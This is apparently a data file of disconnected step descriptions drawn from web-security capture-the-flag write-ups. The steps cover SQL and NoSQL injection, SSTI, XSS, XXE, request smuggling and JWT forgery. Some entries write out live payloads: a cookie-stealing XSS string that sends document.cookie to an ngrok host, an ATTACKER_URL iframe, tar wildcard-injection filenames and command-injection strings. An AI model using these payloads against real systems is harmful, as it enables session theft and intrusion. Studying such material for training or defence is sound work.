    "Determine the correct answers to the security questions",
    "Spoofed the client IP address",
    "Determine a method to bypass Jinja2 SSTI filters",
    "Inspect the functionality of the website.",
    "Analyze the requirements for exploiting RCE",
    "Encode the solution string using base64 to generate the 'userdata' parameter.",
    "Discover the server technology.",
    "Identified the prototype pollution vulnerability.",
    "Move into burp suite.",
    "Use a new approach that does not involve factorization to achieve a payload with an even smaller character size",
    "Start a loop.",
    "Identified /login and /forgotpassword.html as especially interesting.",
    "Generated the md5 hash for both binary data.",
    "Set X-Forwarded-For header to 172.16.2.24.",
    "Notice the Linux logo is gone from the page",
    "Attempted to escape the 'shell_exec' function.",
    "Retrieve the flag.",
    "Receive the request.",
    "Inspect the cookie.",
    "Checked if the 'recv' query parameter was a subdomain of 'jsapi.tech'.",
    "Discover an edge case where not closing a BBCode tag results in an unencoded content being reflected",
    "Formed a request to the proxy server.",
    "Capture the flag.",
    "Identified that the rate limiting limits the number of OTP attempts to 3.",
    "Exclude the reference to the dummy page from the list of PDF pages.",
    "Revisited the original payload.",
    "Analyze the secure portal page source",
    "Visit the website.",
    "Intend to run arbitrary PHP code.",
    "Send a request to obtain a list of all users.",
    "Note the class index as 405.",
    "Visited the URL provided by the successful attack and obtained the flag.",
    "Successfully retrieved the Flag",
    "Craft a payload for XXE exploitation",
    "Continued to analyze the output from SQLmap.",
    "Understand that redirects to 'http://app/login.php' will not solve the challenge",
    "Encounter additional missing git objects.",
    "Identified the '/usr/games/cowsay' game",
    "Used Remote Flutter Widgets package for decoding.",
    "Investigated users.php page.",
    "Observe that due to request length limits around 3000 queries are batched at a time.",
    "Identify the 'eval()' vulnerability",
    "Send a POST request to '/show_secret'.",
    "Verify that the replacement is non-recursive.",
    "Set 'json' as the language attribute for the new HTML script element",
    "Identify the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/admin' from the 'robots.txt' file",
    "The payload executed successfully",
    "Directed the cookies from the server to the `/cookie/` endpoint",
    "Develop a Python script",
    "Verify that the token is successfully signed.",
    "Identified the admin's visit as a third request.",
    "Take the second part of the flag from step 3",
    "Identify the potential SSTI vulnerability.",
    "Compress the modified files back into a zip archive named 'modified.odt'.",
    "Find out the decryption key by using the 'key_id'",
    "Search for a checked checkbox for 'flag{'.",
    "Injected arbitrary HTML",
    "Included a \\n character in a chunk extension in the second part of the challenge.",
    "Any site can create an iframe of the web application and receive the message",
    "Executed an HTTP request.",
    "Understand that PHP only considers the integer part of 'id' for the cast.",
    "Access the website of the challenge",
    "Note that the Python microservice allows the running of arbitrary commands when the GET method is used",
    "Programmed the server to redirect to 'http://localhost/flag' in the second response.",
    "Visit the rule page.",
    "Identify the functionality of the addCaptcha() function",
    "Test the SQL payload by iteratively substituting different lengths for '$LENGTH$'.",
    "Observe the retrieval of the flag",
    "Included a special character between 'Transfer-Encoding:' and 'chunked'.",
    "Authenticate on behalf of the admin without success.",
    "Replace the email value in the intercepted Post Request with a controlled one.",
    "Open http://18.213.16.123:5000/ in a web browser.",
    "The XML payload was designed to extract information from /var/www.",
    "Perform SQL Injection to read all posts from 'posts'",
    "Send GET request to 'https://shiba.yactf.ru/api/boop' 1500 times within the loop.",
    "Apply the necessary adjustments to the injection to ensure it fits within the limitations.",
    "Discover that the 'language' field is set according to the parameter passed via the POST handler for '/localization-language'.",
    "Check the cells",
    "Recognized that the parameters in the WebSocket message could be modified.",
    "Include a calculation statement in the request",
    "Find the 'flag.txt' file.",
    "Constructed a base to perform SQL injection.",
    "Provide an empty array for 'variables'",
    "The content written in the request was 'HACKED'",
    "Create an account on the website.",
    "Executed a HTTP POST request",
    "Notice that the JWT token is checked in the response for '/localisation-file'.",
    "Unlock and buy the 'flagsword'.",
    "Identify that the 'member' field within the token object is currently set to 0.",
    "Identify the flag in the 'X-Localhost-Token' header in the received server response.",
    "Obtained new AWS credentials",
    "Found another part of the flag: us3full_1nf0rm4tion}",
    "Uploaded the first created PDF file to the website.",
    "Planned to redirect anything to '127.0.0.1/api/true-answer' to capture the flag.",
    "Realized the action fails due to the blacklist filter.",
    "Failed as the function doesn't allow special characters like '%'.",
    "Exploit the web application by performing Remote Code Execution (RCE) due to Prototype Pollution.",
    "Verify if the flag is displayed on the screen",
    "Access the website",
    "Locate the 'app.py' file",
    "Identify the utilization within the 'send_sms' function",
    "Recognize that the `unserialize` function can lead to Remote Code Execution (RCE)",
    "Encode the payload using Python on the server.",
    "Utilize the 'subdomain enumeration' technique when guessing proves unsuccessful.",
    "Create a request for '/admin../uberadmin/flag.txt'.",
    "Implemented an error-based approach.",
    "Successfully retrieve a link",
    "Ensure payload always returns true",
    "Intercept register request.",
    "Identify the character from the script output.",
    "Returns response headers.",
    "Successfully read the flag.txt file using the manipulated RGB value.",
    "The reason for inability to modify is due to a lack of appropriate permission",
    "Observed any unusual behavior",
    "Crafted a final payload that exploits the bypass.",
    "Note that each user's JWT key is stored in a Redis cache.",
    "Upload a DOCX file",
    "Received a JWT session token.",
    "Read the function getBrowserWithTimeout.",
    "Used a payload conforming to the INSERT query syntax.",
    "Encode the malicious serialized class in base64",
    "Investigated the search function.",
    "Inspect 'challenge/helpers/CardHelper.js' file for SSTI vulnerability.",
    "We cannot reach the '/queries' endpoint as the IP address required is 127.0.0.1, any other IP is redirected to '/'.",
    "Brainstorm ideas.",
    "Explore the website interface.",
    "Open the website 'very.uniquename.xyz:8880'",
    "Inject a NULL byte into the final URL.",
    "Studied the official `mysql` docs",
    "Look for available endpoints in the downloaded `openapi.json` file.",
    "Observe that the '/pleb' proxy isn't forwarding non-ASCII characters.",
    "Observe unsuccessful results.",
    "Recognize the first position in the JSON array as the winning position.",
    "Acknowledge that there is no known way to bypass the requirement for 'http://localhost' as the origin.",
    "Use trial and error to narrow down the appropriate number.",
    "Visited the reported portion of the JavaScript file.",
    "Observe the response from the web application.",
    "Understand that the code retrieves a note.",
    "Attempt to change status to 'premium'",
    "Run the command 'python3 payload.py | nc localhost 8000'.",
    "Notice that the entered URLs are rendered by a Chromium instance.",
    "Set the '$method' attribute in the serialized object to be 'doit'.",
    "Unsuccessful in decoding the data contents.",
    "Look for elements in the '/home' directory.",
    "Find the flag on the accessed page",
    "Access the migrate.php page",
    "Logout",
    "Observed data containing usernames and card numbers.",
    "Understand that it performs an HTTP GET call.",
    "Use the retrieved 'magic code' to complete the login",
    "Used the discovered mapping to smuggle a request to /admin in flagportal.",
    "Confirm that the payload is not blocked.",
    "Send the composed POST request via curl.",
    "Identify the version of SQL Alchemy",
    "Understand the 'vsCAPTCHA' app.",
    "Retrieve user and read permissions from the injected command.",
    "Open the function addCaptcha() in the devtools",
    "Used backticks around the numeric table name.",
    "Retrieve the flag from the 'flag' column in the 'flag' table",
    "Discovered two strange cookies: 'frequency' and 'transmissions'.",
    "Create a new script element.",
    "Analyze the Python code.",
    "Understand that the previous request smuggling method will not capture the second response from Puma.",
    "Injected '<base href=\"http://HOST:PORT\">' into the profile via 'user['title']' or 'user['lab']'.",
    "Observe that the system environment flag is displayed when the response contains the specific IP address (119.29.29.29).",
    "Realize that the login site has filters applied to the quotation marks",
    "Locate the 'Content-Type' header in the HTTP request.",
    "Perform a string search on the 'out.bin' file.",
    "Replace the string 'alert(1)' with the converted string of our JavaScript payload.",
    "Obtain all entries in a column as a single row",
    "Identify available endpoints.",
    "Consult a list of strings that generate these 'magic hashes' in PHP",
    "Use a debugging tool such as regex101.",
    "Observe the discovery of over 1900 logs.",
    "Investigate verifyPassword() and observe the use of bcrypt password verification.",
    "Recognized that the app is rendered on a `<canvas>`.",
    "Check if the response text contains 'LITCTF{' to identify a CTF flag.",
    "Add the CAPTCHA parameter to the link.",
    "Learn that if a string starts with '0e...' in PHP, it is treated as a float with the value 0.0",
    "Use the obtained JWT to authenticate using the /api/normal endpoint.",
    "Insert '__proto__' attribute in the request payload.",
    "Confirm the first 'if' statement would be passed.",
    "Find the webpage of the 'Modern events calendar' plugin.",
    "Downloaded the 'pack-names' file from 'repository' folder on the target server.",
    "Create a JWT with 'username: admin'.",
    "Recognize that XInclude directives allow the parsing of files.",
    "Utilize the curl command to navigate through subdirectories.",
    "Set the 'imports' key to map '/js/ast-to-js.mjs' to '/js/eval-code.mjs'",
    "Include session ID in the request.",
    "Set up a request with malicious cookie data",
    "Decide to create a new HTML script element",
    "Got two different URL encoded strings.",
    "Analyze the HTML code of the page",
    "Submit the crafted URL to the Admin Bot.",
    "Inspect website's code.",
    "Note that spaces or slashes in the filename are not allowed",
    "Insert PHP code into DocumentName",
    "Find that the read endpoint is '/admin'.",
    "Understand using Import Maps will help in switching 'astToJs' to 'evalCode'",
    "Write a binary.",
    "Learn about the SQLite code",
    "Analyse the downloaded nginx.conf file.",
    "Reviewed the PHP code closely.",
    "Extract the flag from the '/flag' file.",
    "Visited the challenge link",
    "Realized it might be possible to force the admin bot to perform a search function on the server.",
    "Access the URL: http://highsource.tuctf.com/",
    "Submit the payload through the form.",
    "Flag is output after successful execution of the attack.",
    "Use an XSS payload.",
    "Insert the phar file into the exploit",
    "Inspect the returned results after uploading the barcode.",
    "Observe that the page uses relative JavaScript paths.",
    "Inspected the source code of the newly accessed webpage.",
    "Locate the 'Referer' header in the HTTP request.",
    "Use 'cd buckets/bucketsoffun-ctf/'",
    "Create a function named 'api'.",
    "Encode a new JWT token with the modified 'role'.",
    "Recognize that the 'author' field can be used to execute the attack.",
    "Notice a flaw in the check condition.",
    "Review the database.py file.",
    "Identify a cookie named 'admin_id : 0'",
    "Recognized that the 'basename()' function is used in the PHP script",
    "Exploit the SQL injection vulnerability",
    "Consider using older object manipulation features like '__defineSetter__' and '__defineGetter__'.",
    "Noticed password verification with passwordVerify.",
    "Discover the missing git objects.",
    "Prepared the SQL query to send to File Descriptor (FD) 4, which is the MySQL server.",
    "Paste the introspection query into BurpSuite.",
    "Use 'll'",
    "Identified that the PHP code output the flag when a specific username 'flagman69' is used.",
    "Confirm the existence of the 'upload' page",
    "Recognize the presence of a file named 'flag.jpg'.",
    "Read the contents of 'flag.txt'.",
    "Notice that the JavaScript code checks if the outcome equals 1337 to give the flag",
    "Examined the 'if' condition that appears to determine the login logic",
    "The unencoded content being reflected leads to an alert in the browser",
    "Execute the command cat /flag.txt.",
    "Generated a payload for executing a command.",
    "Include special characters in the inputs.",
    "Deploy this page on a server.",
    "Create an exploit script.",
    "Identify SQL injection vulnerability",
    "Visited the challenge webpage",
    "Identified the use of strlen() function within the code.",
    "Submitted the flag.",
    "Opened the 'storage.db' file with a SQLite database reader",
    "Consider setting up a personal DNS server for a more reliable solution.",
    "Visited the provided webpage",
    "Visited the URL which led to a website containing a list of books.",
    "Identified vulnerability to log4j 2.14.1.",
    "Observe the flag in the response after placing the cookie.",
    "Notice that users are redirected.",
    "Recognize user input concatenation in the SQL query",
    "Created a callback that reflected the response into Javascript code.",
    "Print the flag.",
    "Start the challenge instance.",
    "Discover POST requests sent to '/forgotpassword.html' page.",
    "Concatenate possible characters to the end of the flag.",
    "Find the usage of the username after authentication",
    "Brute-force user-agent strings in burp suite.",
    "Recognize a possible chance to test Local File Inclusion (LFI).",
    "Discovered the presence of only two tables - nxf8_users and nxf8_sessions.",
    "Gain access as an admin user.",
    "Conducted research and determined that Apache server version 2.4.49 has a known vulnerability",
    "Realized the potential for prototype pollution",
    "Use the BZR Check command to find any missing files.",
    "Include the cleaned, manipulated PDF data in 'collision2.pdf'.",
    "Noticed rate limiting being enforced on a per-email basis through a Redis store.",
    "Attempt to read the required file.",
    "Visit the targeted website.",
    "Continued to interpret the results from SQLmap.",
    "Locate a PRIVATE KEY within the file",
    "Enter 'St. Michael's' for First School Attended",
    "Print the hint",
    "Take note of the Nginx configuration",
    "Inject a further cookie.",
    "Identified the CSS rule with 'background' property.",
    "Notice server-rendered pages.",
    "Run arbitrary javascript with the 'outputFunctionName' option",
    "Encode the JWT by setting the algorithm to 'none'",
    "Attempt to guess admin's subdomain.",
    "Accessed the Cowsay as a Service Challenge website",
    "In the script, manipulate the multiple URL opens.",
    "Recognize the necessity.",
    "Attempted to login which returns 'User not active' error.",
    "Write a python script.",
    "Develop an SQL payload that determines the length of the intended data ('flag').",
    "Defined a GUID for the key.",
    "Observe the page indicating SQL Injection attacks are blocked.",
    "Discover /private.php.",
    "Payload 3: Obtained readable cookies.",
    "The flag was found in the error, leading to successful completion of the challenge.",
    "Notice that the application is a 'screenshotter' service.",
    "Identify the 'add_money_to_login' function added to the template context",
    "Attempt to use the /api/admin endpoint using the obtained JWT.",
    "Note that 'scandir' and 'file_get_contents' are not disabled",
    "Recognized it as part of Angular's internal methods fetching '/api/answer' from server-side.",
    "Identify the flag in the response section of that response.",
    "Identify the need to use a valid identifier to steal the data",
    "Understand that the XSS vulnerability can enable CSRF attacks on the admin.",
    "Include a script for a basic alert in the uploaded LaTeX document",
    "Inject entity 'xxe' into 'app.xml'",
    "Confirmed server-side file inclusion.",
    "Identify the flag as 'INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}'.",
    "Try the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"z\"}}",
    "Serialize the created object and encode it in base64 format.",
    "The condition to receive the CTF password (flag) is checked.",
    "Create a JWT with the permissions set to 'admin' and the secretid set to a string that does not exist in the secrets array",
    "Implemented a logic that changes the cookie flag each time a request is made",
    "Appended unique transmission values to a list.",
    "Check the website response.",
    "Execute the Python script",
    "Access the specified path in the website",
    "Received an error of HTTP method not allowed.",
    "Obtained the flag from 'private.php'.",
    "Identify that the application is 'Powered by PHP-Proxy'.",
    "Use the signing certificate to generate a new HMAC signature.",
    "Discovered that the app uses local storage to save notes.",
    "A check is performed on the response text.",
    "Located Maria's session ID.",
    "Utilize the secret key for crafting the new session cookie.",
    "Identify the converted string as a Bitcoin Wallet password.",
    "Observe that the fetched resources are inserted into the 'ajax-load' element.",
    "Automate the process of discovering the next character in the password.",
    "Located a PHP webpage.",
    "Identify the endpoint /rin that uses SSRF code.",
    "Identified 2 HTTP request smuggling vulnerabilities.",
    "Examine the registration fields",
    "Crack the md5 hashes.",
    "Press the enter key.",
    "Decrypted the MD5 hashes",
    "The bash script would only spawn the shell if the caller is root",
    "Verified the flag value: HarekazeCTF{j4v4scr1pt-0bfusc4t0r_1s_tsur41}",
    "Successfully use the same CAPTCHA code to test two different MFA tokens by sending them both in the same HTTP request.",
    "Obtain the flag.",
    "Tested the SSTI vulnerability by crafting a URL that performed simple arithmetic in the email parameter using Jinja2 template syntax.",
    "Identify the 'admin' field and its value.",
    "Analyze the form provided to upload images.",
    "Realize that the potential path traversal vulnerability can be exploited.",
    "Initialise a local Bazaar repository.",
    "Refer to the downloaded JSON to understand the functionality of the `/new` endpoint.",
    "Remove the first file created.",
    "Wrote a request to the root directory",
    "Understand that 'notes.count' returns the count of notes that pass the filter.",
    "Realize that the check should be for iframe value not being an object, not iframe itself.",
    "Observe the two types of messages: 'Problems with Profile' and 'Get premium account'",
    "Determine that the server's response suggests Server Side Template Injection.",
    "Observe register and login pages.",
    "Analyzed the HTML source code.",
    "Include 'Content-Type: application/json' in the request header.",
    "Used the provided code snippet.",
    "Recognize that the npm package `node-serialize` is vulnerable to node-deserialization RCE attack",
    "Notice that the remainder of the session cookie is a signature.",
    "Found a link for an example json file",
    "Establish a connection to localhost:12380.",
    "Generate a GET request to the page, with the chosen strings as the values for 'i1' and 'i2'",
    "Build a second-stage exploit.",
    "URL format: `http://challenge.nahamcon.com:32132/exploit?text=%3Ciframe%20src=%22https://ATTACKER_URL/exploit.html%22%3E&color=%2324d600`",
    "Sent the POST request",
    "Identified that the underpinning technology of the web application is PhantomJS/2.1.1.",
    "Search in the source code for the flag's presence",
    "Leverage the behavior of 'Buffer' stopping at the first non-hexadecimal character.",
    "Append the xss=<script src=\"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/sha512.js\"> parameter to the query.",
    "Gain a shell.",
    "Checking if the character's index matches the desired one.",
    "Change the 'account[role]' attribute to 'admin'",
    "Attempted accessing 'http://IP:PORT/?command=ls'.",
    "Performed an internal port scan for ports between 5000 and 10000.",
    "Devise a strategy to manipulate the content of the cowfile.",
    "Utilized MySQL comments to act as spaces.",
    "Set up a local HTTP proxy using cURL to accommodate the complex GET request.",
    "Flag was in the user agent.",
    "Find a comment containing PHP code to upload a file",
    "Identify the variables $blocked, $special_block, and $$special_block",
    "Write a Python script to automate the process.",
    "Created a malicious URL.",
    "Execute the 'cat index.php' command.",
    "Inspect the search feature of the provided platform",
    "Determine suitable regular expressions based on the test.",
    "Designed a payload to retrieve cookies and encode them in base64.",
    "Identify the upload form on the website",
    "Identify that the website can't send double opt-in emails",
    "Fail to find 'sdctf' in the logs.",
    "Analyzed the website behavior.",
    "Discover that HTML files are uploaded successfully despite checks for images.",
    "Perform a POST request to the path provided by the decoded message.",
    "Use 'git clone https://github.com/sa7mon/S3Scanner.git'",
    "Read '/proc/self/environ' to retrieve the flag.",
    "Identify that the sha1 hash of '10932435112' starts with '0e...'.",
    "Receive a response from the server.",
    "Found that the preview feature is an iframe",
    "Identify an interaction with the website that involves a 'counter' cookie",
    "Find the specific vulnerability in the PHP code that allows object injection.",
    "Use Apache httpd 2.4.49 to handle the connection.",
    "Construct a page hosted on a domain starting with 'localhost'.",
    "Committed the change to the repository.",
    "Identify the app as a page.",
    "Add phpinfo() to the code in the PHP shell",
    "Identify unique JavaScript with nextExport attribute.",
    "Used GROUP_CONCAT function to concatenate all retrieved column names into a single string.",
    "Include the payload in the username parameter.",
    "Test the code with 'flag{randomString}'.",
    "Visit the website.",
    "Review the code of the 'query_login_attempt' function.",
    "Noted the mention of a removed 'index.php' file.",
    "Display current cookies",
    "Performed the action of claiming the Free Flag.",
    "Identified possibility to use 'Parameter Pollution' by having two 'amount' arguments.",
    "Note the presence of certain blacklisted words as restriction",
    "Use the 'md5' function to hash the bytes.",
    "Retrieved the text content.",
    "Realize that initialization of the 'mfa' attribute as a reference to the '_correctValue' attribute allows to bypass the MFA check.",
    "Set the 'User-Agent' as per the requirement in the PHP code.",
    "Created a new directory titled 'ctf-bzr'.",
    "Make a HTTP request.",
    "Use the 'jsonwebtoken' library",
    "Observed the usage of 'asdf<link rel='stylesheet' href='...'>'.",
    "Visit the provided URL.",
    "Research methods of bypassing strict checks.",
    "Search for related pull requests on github.",
    "Final part performs variable dump (var_dump($_0)).",
    "Used '__proto__' as the username parameter",
    "Understood that the admin bot stores a flag as a note on the challenge server before visiting the URL.",
    "Directly call the directory function with 'flag' as its parameter.",
    "Create the file '--checkpoint=1'.",
    "Initiated a database dump.",
    "Searched the leaked contents of the admin page",
    "Bypassed input validation",
    "Located the vulnerability in the '/cornelia' URL.",
    "Use YAML to analyze the script.",
    "Enter username 'admin' and password 'admin' to login.",
    "Use the located credential.",
    "Discover that the captured screenshot is of a submitted webpage URL",
    "Identify JWT 'secret' cookie as 'dawgCTF?heckin#bamboozle'",
    "Observe the data from the /etc/passwd file in the response",
    "Import 'os'.",
    "Interpreted a template string",
    "Noted the payload as {'user':'guest'}",
    "Open the provided URL.",
    "Analyze the HTML for possible vulnerabilities.",
    "Receive internal web page response for the second GET request.",
    "Wrote a Python script to automate the requests",
    "Add the appropriate `nonce` from the rest of the script tags.",
    "Identified the 'user_id' column as requiring a foreign key from the user table.",
    "Use the 'mutool' command to manipulate the PDF files.",
    "Indicate that only one note contains the flag.",
    "'src' set to local files",
    "Bypassed message length restriction.",
    "Discovered the password 'w0rdc0unt123'.",
    "Noted that the `/api/token` endpoint returns the current authentication token.",
    "Use the 'glob' function to find interesting files",
    "Create the file '--checkpoint-action=exec=sh shell.txt'.",
    "Made HTTP GET requests to the provided URL.",
    "Create a URL that would circumvent the '/debug*' restriction.",
    "The purpose of adding debug prints is to confirm the suspected vulnerability",
    "Check the 'robots.txt' file for the disallowed path.",
    "Checked the network tab",
    "Output the constructed command.",
    "Recognize that the decoded text is the true flag.",
    "Decoded the base64-encoded string.",
    "Apply `attr()` filter with payload `/submit?value={{()|attr(request.args.c)}}&c=__class__`",
    "Set the 'view options' setting",
    "Understand that brute forcing is not a viable option.",
    "Analyzed the provided PHP source code.",
    "Observe that the payload returns 'false'.",
    "Constructed the final payload URL",
    "Execute 'ls' command on the server using `subprocess.Popen`",
    "Check if 'length' query parameter exists.",
    "Explore the alternative of exploiting Cross-Origin Resource Sharing (CORS) policy violation as a faster and more efficient method",
    "Give SUID and SGID permissions to the binary.",
    "Input the payload to attempt to spawn a reverse shell.",
    "Decided to write a script to automate the process",
    "Understand the purpose of the attack is to display an image only when the bot accesses the site.",
    "Bypassed localhost address checks by setting the '$url' attribute to 'file:///var/www/html/config.php'.",
    "Navigate to the root directory.",
    "Set 'GET /flag HTTP/1.1' as the second request.",
    "Loaded the challenge page as an 'iframe' in the exploit page.",
    "Attempt to access the URL `http://3.91.17.218/.git/`.",
    "Experimented with each method.",
    "Saved the generated CSS in 'exploit.css'.",
    "Observe the PHP code of the website",
    "Capture the response from the server.",
    "Perform a GET-based CSRF through a top-level navigation.",
    "Call a range from the document",
    "Used the command 'cat /flag.txt' as part of the URL parameter.",
    "Speculated a connection with security protections such as WAF after noting certain factors.",
    "Identify User Login section.",
    "Attempted various inputs.",
    "Create an Image object with a controlled filename.",
    "Create 'payload' in the format of a SQL statement",
    "Identified a different flag value in the response",
    "Find students' emails exposed at https://wpiadmin.wpictf.xyz/topStudents",
    "Identify the flag in the URL.",
    "Note that the Go microservice acts as a reverse proxy for the Python microservice when the PUT method is used",
    "Search for the flag on the browser",
    "Replaced the current 'pack-names' file with the downloaded 'pack-names' file.",
    "Notice that the URL changes when querying any other galleries.",
    "Reveal the flag within the decoded value.",
    "Observed the need for a server response after each vote.",
    "Exploited YouTube's JSONP response and BeautifulSoup's parsing differential.",
    "Encounter the text 'Hello Mars!'",
    "Enumerate the characters that are converted to underscores.",
    "Perfect payload",
    "Choose to make an internal request.",
    "Identify that it uses proxy_pass to forward requests.",
    "Reviewed the challenge.",
    "Emulate local host client access",
    "Output the password string and the trimmed section of the server response.",
    "Inject another cookie.",
    "Understand that the SSRF request must be made immediately after login.",
    "Concluded the extra div was rendered when no request is received.",
    "Referenced the MySQL documentation related to the protocol level.",
    "Construct a post form.",
    "Identify the CAPTCHA checkbox.",
    "Figure out the XML External Entity (XXE) vulnerability in upload.php.",
    "Use the obtained encryption key",
    "Note that the only missing piece is the 'token'",
    "Used localhost:55043/login.php as the target URL.",
    "Created an EC2 instance using the new role",
    "Understood that the input had to satisfy certain constraints, chiefly that 'name' could only contain alphanumeric characters, and 'email' had to pass RFC5322 validation.",
    "Realize it can be used to execute shell commands from within Python.",
    "The 'minimag' and 'bbcode' commands are used for parsing content into HTML in the post_view.tpl file",
    "Analyze the file named apache_ctf.conf.",
    "Download the 'last-revision' file from the target server.",
    "Successfully bypassed restrictions.",
    "Verify token using jwt.io.",
    "Have a clearer perspective.",
    "Retrieved the link to the admin portal from student communication",
    "Final server returns Server: Apache/2.4.50 (Unix).",
    "Change User-Agent to 'Linux Xbox' using curl",
    "Set 'process.env.npm_execpath' to a controlled value.",
    "Sent a GET request to access the cache data",
    "Create the final payload: '?cat=random\"onerror=\"window.location=`https://f5e6-49-245-33-142.ngrok.io?${document.cookie}` img'",
    "Identify that the program checks if IP matches certain values to confirm it's a valid non-private IP.",
    "Identify the functionality of storing the request body object into a database.",
    "Sensitive, user-specific data could be read if /api/filter endpoint returns based on these cookies",
    "Observe the output.",
    "Set malicious cookies.",
    "Run the script.",
    "Find a JavaScript feature called Template Literals.",
    "Injected an 'a' tag.",
    "Look for any unusual strings.",
    "Search the entire file system for files named 'flag'",
    "Discover that 'website' runs 'yarn dev'.",
    "Obtained the flag `MetaCTF{if_brute_force_doesnt_work_use_more_brute_forceeeeeeee}`.",
    "After this, you should see the flag in your Flask terminal and in the 'cookies.txt' file.",
    "Inspected Create Post code.",
    "Copy the output from the crafted reverse shell payload.",
    "Recognize it as a GZip archive",
    "Inspect the webpage.",
    "Obtain the flag",
    "The first response is designed to pass the SSRF check.",
    "Wrote a python script",
    "Open the link provided in the CTF challenge - http://138.247.13.111",
    "Change the browser's user agent to IE 6.01 through developer tools in the browser.",
    "Sent a POST request to /login.php.",
    "Received an error of HTTP method not allowed.",
    "Locate 2 'users.db' files.",
    "Encounter a message saying browser is unsupported.",
    "Run the Python script.",
    "Create separate account",
    "Determine the IP address in the URL.",
    "Stop the loop.",
    "Identified the remote Flutter widget file signature.",
    "Found the chain of properties",
    "Receive an error for missing launch time.",
    "Identify the text as the final flag of the challenge.",
    "Tried submitting possible answers.",
    "Recognize that query string cannot have underscores.",
    "Utilize 'last' to get the last item of a list.",
    "Input the SQL injection payload in the 'password' field as `username=admin&password=' or '1`.",
    "Noted the use of DOMPurify for HTML sanitization.",
    "Trigger the command './flag_dispenser' when the __destruct method is called.",
    "Wait for the site to load.",
    "Set the GET parameter to 'print=echo+'';phpinfo()'",
    "Realized it gives the possibility to pass an object in the query statement",
    "Understand that this vulnerability could lead to Remote Code Execution (RCE).",
    "Obtained the flag.",
    "Visit the provided site",
    "Modified .htaccess to interpret .php16 as PHP.",
    "Ensure the value is {\"hash\": \"T35T\"}",
    "Devise a strategy involving acquiring the secret key from the store object.",
    "Exploit the `ejs` module.",
    "Obtain the flag",
    "Buy flag sold with negative price",
    "Define sections of the path to the flag.",
    "Create a CSRF page.",
    "Find the renamed file path of the uploaded image",
    "Upon granting admin privileges",
    "Understood that a user-controlled 'uri' is involved in the attack.",
    "Registration process was completed in the system.",
    "Noted that 'y.png' loads if the query is found within a note.",
    "Include the cookie.php file",
    "Send the POST request to change the status of the services.",
    "Conducted a study about PhantomJS/2.1.1.",
    "Check the length of the window's history.",
    "Check if the possible character is part of the flag.",
    "Suggested using a query parameter.",
    "Set the 'language' parameter to 'key' in the JSON data.",
    "Observe that Baby Eval is a Node app.",
    "The response text contains the new 2FA token.",
    "Deduce that the database logic requires password token.",
    "Created a payload using python pickle containing a command execution statement",
    "Performed cross-origin request using `jsonp`",
    "Assign the value 'admin' to the cookie.",
    "Include 'credentials: include' in the request to bypass same-origin policy restrictions.",
    "Attempt a Cross-site Scripting (XSS) attack.",
    "Unable to find flag files.",
    "View the source code.",
    "Modify the initial JavaScript payload.",
    "Value: 127.0.0.1",
    "Leverage the assumption that the word 'launch' could be a keyword.",
    "Identify that the valid signature can be obtained from the .env file",
    "Analyzing the provided Javascript and Dockerfile scripts.",
    "Ran 'insecure' to obtain a root shell",
    "Set debug parameter to TRUE",
    "Devise a payload.",
    "Identify the 'hidden token' protection",
    "Enumerate root directory",
    "Select and copy the flag",
    "Attempt to navigate to /admin.phps",
    "Check for notes that match the regex pattern 'flag{.*}'.",
    "Manipulate the query using the union operation.",
    "Received a 403 Forbidden error from the login.php page.",
    "Discovered an interesting comment (?source=1).",
    "Obtain the 'userId' from the decoded information.",
    "Trigger the XSS alert attack using the final URL.",
    "Utilize https://jwt.io/ or a JWT-signing library for the JWT creation.",
    "Recognize the replacement of certain string patterns as a blacklisting mechanism.",
    "Repeat the previous substep 4 more times",
    "Included the final payload as part of form data.",
    "Retrieve the flag from the URL parameter",
    "For each possible character.",
    "Figured out how to use '--eval' option to run inline JavaScript.",
    "Enumerated the columns of the user table.",
    "Followed the challenge description",
    "Identified 'Server' response header.",
    "Construct the URL 'http://10.8.201.87:5000/checkbalance?amount=${num}' using the queried amount.",
    "Automate the submission of different text fragments.",
    "Understand the requirement of a 'Buffer' of 16 bytes.",
    "Exploited a difference in how ATS and Waitress process end-of-line symbols.",
    "Realize that the system should have a `package.json` file",
    "Tried '127.0.0.1;ls /root' in URL.",
    "Initialize an empty password string.",
    "Locate the 'admin' page.",
    "Started analysing how the web application processes Markdown",
    "The application connects to a sqlite database ('const db = new Database('toy_workshop.db');'), so inspect 'database.js'.",
    "Notice the difference in redirect URLs when a note is found or not found",
    "Recognize the need for an 'Authorization' header.",
    "Identify the user 'true.grit@umbccd.io' through PCAP analysis.",
    "Checked the source code of the homepage",
    "Retrieve the flag.",
    "Realize that 'eval' can be triggered by entering a payload as the GET query parameter.",
    "Determine that the input fields for the login function are 'username' and 'password'.",
    "Identify that the website is vulnerable to SQL injection.",
    "Examined the website's '.git' folder",
    "Found a snippet of JavaScript code containing database credentials and a 'JSESSIONID' cookie.",
    "Recognize potential wildcard injection vulnerability.",
    "Viewed the stored data",
    "Access the provided URL for the decryption service.",
    "Constructed a PHP redirect to access 'localhost:8081/flag'.",
    "Perform local test using a python command.",
    "Identify what server-side checks are being done.",
    "Understand the requirement of a private and public key",
    "Identify blacklisted characters mentioned in the code.",
    "Identify a `navigator.battery.charging call` in the JavaScript.",
    "Understand that the mechanism validates the URL format",
    "Observe redirection to domain name threeofhearts.ctf.net.",
    "Retrieved a POST request.",
    "Identify HTTP request smuggling as the first obstacle.",
    "Identified the exploitation of a 302 redirect.",
    "Write script to automate this process of generating payloads and making POST requests.",
    "Noted that the index is randomized.",
    "Exploit the remote command execution vulnerability",
    "Performed a port scan and identified Apache server version 2.4.49 operating on port 12380",
    "Observe that the checkbox generates a random string.",
    "The encoded XMLHttpRequest retrieves document's cookie.",
    "The challenge entailed shellcoding in the context of PHP to make SQL queries under a sandbox environment.",
    "Interpret the hint given",
    "Enter an empty username and arbitrary password.",
    "Identify that the cookie 'token' has the httpOnly attribute.",
    "Receive an error: Forbidden, missing JWT authorization.",
    "Identify that the website is under HTTPS.",
    "Directory switching.",
    "Research if 'ereg' instruction can be bypassed.",
    "Admin Bot visits the URL.",
    "Identified the specific version (2.4.0) of HAProxy.",
    "Connect to the website 'https://web5.ctfsecurinets.com/flags.php'",
    "Interpret 'SSTI' as a hint to 'Server-Side Template Injection' vulnerabilities",
    "Append the new HMAC signature to the header and payload.",
